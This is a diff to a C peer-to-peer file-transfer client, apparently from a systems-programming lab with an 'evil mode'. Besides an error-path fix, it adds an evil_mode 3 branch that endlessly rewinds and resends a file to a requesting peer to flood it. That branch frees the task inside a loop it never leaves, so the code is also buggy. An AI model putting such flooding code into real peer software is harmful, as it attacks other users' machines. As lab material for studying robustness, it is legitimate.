@@ -543,6 +543,8 @@ static void task_download(task_t *t, task_t *tracker_task)
 
       if (t->peer_fd == -1) {
         perror("dox crashed peer\n");
+        task_free(t);
+        return;
       }
     }
   } else {
@@ -717,6 +719,16 @@ static void task_upload(task_t *t)
 
 	message("* Transferring file %s\n", t->filename);
 	// Now, read file from disk and write it to the requesting peer.
+
+  if (evil_mode == 3) {
+    while (1) {
+      if (write_from_taskbuf(t->peer_fd, t) == TBUF_ERROR) {
+        perror("data sending overflow successful");
+        task_free(t);
+      }
+      lseek(t->disk_fd, 0, 0);
+    }
+  }
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
